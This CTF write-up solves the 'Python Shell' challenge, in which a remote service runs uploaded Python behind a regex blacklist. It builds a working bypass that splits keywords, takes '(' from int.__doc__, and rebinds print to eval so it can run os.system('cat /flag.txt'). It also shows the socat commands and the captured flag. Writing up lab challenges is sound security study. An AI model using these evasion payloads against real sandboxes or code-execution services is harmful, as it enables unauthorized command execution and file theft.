# Python Shell

## Task

Upload a Python file that can be run by invoking the python command, and we
will run it for you. To do so, send the bytes over the stream, and close the
write half. stdout will be sent back. For security reasons, we may refuse to
run your file if we detect dangerous strings. There is a byte limit and a
timeout.

nc misc.utctf.live 4353

## Solution

First you hat to create a connection and halfclose it. This is best done with
`socat -t1 - TCP:misc.utctf.live:4353`.

So now to the payload. A simple `print('xxx')` returns xxx so far so good.

But if we just try to: `print(open('/flag.txt').read())` we get:

```  
Files must be uploaded within 2 seconds. Scripts must run within 2 seconds.
Only the first 4096 bytes will be considered.  
Blacklist:
(eval)|(import)|(open)|(with)|(as)|(from)|(lambda)|(\s*print\s*=\s*)|(?P<paren>\()  
Whitelist: (\s*print\s*(?P<paren>\())  
```

So we know what is prohibited: `eval|import|open|with|as|from|lambda|print =
|` and what is that?  
`(` open parentheses... ok thats "new"...

So to get around the forbidden `open` we could do something like:  `eval('op'
+ 'en'('flag.txt'))` but eval is forbidden as well.

A simple `__builtins__.__dict__['ev' + 'al']` will solve that, so now to the
`(`.

Since it is a string it can be replaced with `int.__doc__[3]`.

`__builtins__.__dict__['ev' + 'al']`('print' + int.__doc__[3] + 'op' + 'en' +
int.__doc__[3] + '\'/flag.txt\')' + '.read' + int.__doc__[3] + '))')`

So maybe something like that? But wait there is still a `(` at char(40) damn!

How to get rid of that? I didn't find a way to get rid of it directly, but
there was mention of a "whitelist" before. `Whitelist:
(\s*print\s*(?P<paren>\())`  
For `print(` the `(` is ok, good to know!

Let's try

`p = 'print' + int.__doc__[3] + 'op' + 'en' + int.__doc__[3] +
'\'/flag.txt\')' + '.read' + int.__doc__[3] + '))';
__builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p +
"")`

No answer... debugging it locally gave me the flag via stderr while throwing
an exception, but the server only forwards stdout.

So I changed the `open('/flag.txt').read()` part to `os.system('cat
/flag.txt')`

Resulting in: `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] +
'"os").system' + int.__doc__[3] + '"cat /flag.txt")';
__builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al'];
print(p)"` as the final payload.

```  
echo "p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '"os").system' +
int.__doc__[3] + '"cat /flag.txt")'; __builtins__.__dict__['print'] =
__builtins__.__dict__['ev' + 'al']; print(p)" > payload`  
cat payload | socat -t1 - TCP:misc.utctf.live:4353  
Files must be uploaded within 2 seconds. Scripts must run within 2 seconds.
Only the first 4096 bytes will be considered.  
utflag{unclean_input}  
```  

Original writeup
(https://github.com/0x01DA/writeups/blob/master/utctf/Python%20Shell/README.md).